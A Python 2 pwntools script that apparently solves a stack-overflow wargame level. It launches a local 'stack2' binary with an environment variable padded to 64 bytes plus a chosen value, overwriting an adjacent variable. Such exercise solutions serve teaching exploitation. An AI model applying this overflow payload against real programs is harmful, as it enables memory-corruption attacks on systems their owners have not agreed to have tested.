#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import os
import sys

pack = make_packer()
unpack = make_unpacker()

io = process('../bin/stack2', env= { 'GREENIE' : 'A' * 0x40 + pack(0xd0a0d0a) })

context.log_level = 'info'

def exploit():
    try:
        print io.recvline()
        print "pwn!"
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
